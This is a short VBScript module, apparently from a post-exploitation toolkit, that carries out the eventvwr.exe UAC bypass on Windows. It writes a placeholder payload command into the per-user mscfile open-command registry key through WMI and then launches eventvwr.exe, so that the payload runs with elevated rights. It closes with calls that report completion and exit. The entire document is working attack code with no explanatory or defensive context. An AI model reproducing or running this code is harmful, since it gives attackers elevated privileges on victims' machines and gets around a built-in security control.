sub BypassUACEventVwr
    Const HKEY_CURRENT_USER = &H80000001
    strKeyPath = "Software\Classes\mscfile\shell\open\command"

    Set objRegistry = GetObject("winmgmts:\\.\root\default:StdRegProv")
    objRegistry.CreateKey HKEY_CURRENT_USER, strKeyPath

    objRegistry.SetStringValue HKEY_CURRENT_USER, strKeyPath, "", "~PAYLOAD_DATA~"

    KoRunCmd "eventvwr.exe", true
    KoSleep 10
end sub

BypassUACEventVwr

KoReportWork "Completed"

KoExit
